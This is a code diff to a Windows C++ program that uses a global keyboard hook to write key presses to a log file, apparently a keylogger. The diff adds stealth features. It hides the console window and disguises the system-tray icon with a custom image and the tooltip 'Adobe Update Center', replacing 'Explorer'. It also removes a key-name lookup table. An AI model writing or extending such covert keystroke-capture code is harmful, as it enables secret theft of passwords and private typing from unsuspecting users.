@@ -1,6 +1,5 @@
 #include <Windows.h>
 #include <fstream>
-#include <map>
 
 using namespace std;
 
@@ -8,113 +7,11 @@ using namespace std;
 std::ofstream logFile;
 HHOOK keyboardHook = nullptr;
 NOTIFYICONDATA notifyIconData;
+NOTIFYICONDATA nid;
 
-auto getVKCodeValue(DWORD vkCode) {
-    map <DWORD, string> codeMap;
-    codeMap[8] = "BCKSPC";
-    codeMap[9] = "TAB";
-    codeMap[12] = "CLEAR";
-    codeMap[13] = "ENTER";
-    codeMap[16] = "SHIFT";
-    codeMap[17] = "CTRL";
-    codeMap[18] = "ALT";
-    codeMap[19] = "PAUSE";
-    codeMap[20] = "CAPS LOCK";
-    codeMap[27] = "ESC";
-    codeMap[32] = " ";
-    codeMap[33] = "PgUP";
-    codeMap[34] = "PgDN";
-    codeMap[35] = "END";
-    codeMap[36] = "HOME";
-    codeMap[37] = "←";
-    codeMap[38] = "↑";
-    codeMap[39] = "→";
-    codeMap[40] = "↓";
-    codeMap[41] = "SELECT";
-    codeMap[42] = "PRINT";
-    codeMap[43] = "EXECUTE";
-    codeMap[44] = "PRTSC";
-    codeMap[45] = "INS";
-    codeMap[46] = "DEL";
-    codeMap[47] = "HELP";
-    codeMap[48] = "0";
-    codeMap[49] = "1";
-    codeMap[50] = "2";
-    codeMap[51] = "3";
-    codeMap[52] = "4";
-    codeMap[53] = "5";
-    codeMap[54] = "6";
-    codeMap[55] = "7";
-    codeMap[56] = "8";
-    codeMap[57] = "9";
-    codeMap[65] = "A";
-    codeMap[66] = "B";
-    codeMap[67] = "C";
-    codeMap[68] = "D";
-    codeMap[69] = "E";
-    codeMap[70] = "F";
-    codeMap[71] = "G";
-    codeMap[72] = "H";
-    codeMap[73] = "I";
-    codeMap[74] = "J";
-    codeMap[75] = "K";
-    codeMap[76] = "L";
-    codeMap[77] = "M";
-    codeMap[78] = "N";
-    codeMap[79] = "O";
-    codeMap[80] = "P";
-    codeMap[81] = "Q";
-    codeMap[82] = "R";
-    codeMap[83] = "S";
-    codeMap[84] = "T";
-    codeMap[85] = "U";
-    codeMap[86] = "V";
-    codeMap[87] = "W";
-    codeMap[88] = "X";
-    codeMap[89] = "Y";
-    codeMap[90] = "Z";
-    codeMap[91] = "LWIN";
-    codeMap[92] = "RWIN";
-    codeMap[93] = "APP";
-    codeMap[95] = "SLP";
-    codeMap[96] = "NUMPAD0";
-    codeMap[97] = "NUMPAD1";
-    codeMap[98] = "NUMPAD2";
-    codeMap[99] = "NUMPAD3";
-    codeMap[100] = "NUMPAD4";
-    codeMap[101] = "NUMPAD5";
-    codeMap[102] = "NUMPAD6";
-    codeMap[103] = "NUMPAD7";
-    codeMap[104] = "NUMPAD8";
-    codeMap[105] = "NUMPAD9";
-    codeMap[106] = "MUL";
-    codeMap[107] = "ADD";
-    codeMap[108] = "SEP";
-    codeMap[109] = "SUB";
-    codeMap[110] = "DEC";
-    codeMap[111] = "DIV";
-    codeMap[112] = "F1";
-    codeMap[113] = "F2";
-    codeMap[114] = "F3";
-    codeMap[115] = "F4";
-    codeMap[116] = "F5";
-    codeMap[117] = "F6";
-    codeMap[118] = "F7";
-    codeMap[119] = "F8";
-    codeMap[120] = "F9";
-    codeMap[121] = "F10";
-    codeMap[122] = "F11";
-    codeMap[123] = "F12";
-    codeMap[124] = "F13";
-    codeMap[125] = "F14";
-    codeMap[126] = "F15";
-    codeMap[127] = "F16";
-    codeMap[144] = "NUMLOCK";
-    codeMap[160] = "LSHIFT";
-    codeMap[161] = "RSHIFT";
-    codeMap[162] = "LCNTRL";
-    codeMap[163] = "RCNTRL";
-    return codeMap.find(vkCode);
+void HideConsole()
+{
+    ::ShowWindow(::GetConsoleWindow(), SW_FORCEMINIMIZE);
 }
 
 // Function to handle key press and write to log file
@@ -177,10 +74,11 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             notifyIconData.uID = 1;
             notifyIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
             notifyIconData.uCallbackMessage = WM_USER + 1;
-            notifyIconData.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
-            lstrcpy(notifyIconData.szTip, "Explorer");
+//            notifyIconData.hIcon = LoadIcon(nullptr, IDI_WARNING);
+            notifyIconData.hIcon = (HICON)LoadImage(NULL, "icon.ico", IMAGE_ICON, 32, 32, LR_LOADFROMFILE);
+            lstrcpy(notifyIconData.szTip, "Adobe Update Center");
             Shell_NotifyIcon(NIM_ADD, &notifyIconData);
-
+            HideConsole();
             // Minimize the window
             ShowWindow(hwnd, SW_HIDE);
             break;
@@ -205,14 +103,13 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             break;
 
         case WM_USER + 1:
-            // Handle system tray icon messages
-//            switch (lParam)
-//            {
-//                case WM_LBUTTONDOWN:
-//                    // Show or hide the window when the left mouse button is clicked on the system tray icon
-//                    ShowWindow(hwnd, IsWindowVisible(hwnd) ? SW_HIDE : SW_SHOW);
-//                    break;
-//            }
+            switch (lParam)
+            {
+                case WM_LBUTTONDOWN:
+                    // Show or hide the window when the left mouse button is clicked on the system tray icon
+                    //ShowWindow(hwnd, IsWindowVisible(hwnd) ? SW_HIDE : SW_SHOW);
+                    break;
+            }
 
             break;
 
@@ -253,19 +150,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             nullptr
     );
 
+    ZeroMemory(&nid, sizeof(NOTIFYICONDATA));
+    nid.cbSize = sizeof(NOTIFYICONDATA);
+    nid.hWnd = hwnd;
+    nid.uID = 1; // Unique identifier for the icon
+    nid.uFlags = NIF_ICON;
+    nid.hIcon = (HICON)LoadImage(NULL, "icon.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);;
+    Shell_NotifyIcon(NIM_ADD, &nid);
+
     if (hwnd == nullptr)
     {
         MessageBox(nullptr, "Failed to create window.", "Error", MB_OK | MB_ICONERROR);
         return -1;
     }
-
-    HICON hIcon = static_cast<HICON>(::LoadImage(NULL, MAKEINTRESOURCE(32513), IMAGE_ICON, 32, 32, LR_DEFAULTCOLOR | LR_SHARED | LR_DEFAULTSIZE));
-    if (hIcon)
-    {
-        SendMessage(hwnd, WM_SETICON, ICON_BIG, (LPARAM)hIcon);
-        SendMessage(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)hIcon);
-    }
-
 
     // Message loop
     MSG msg;
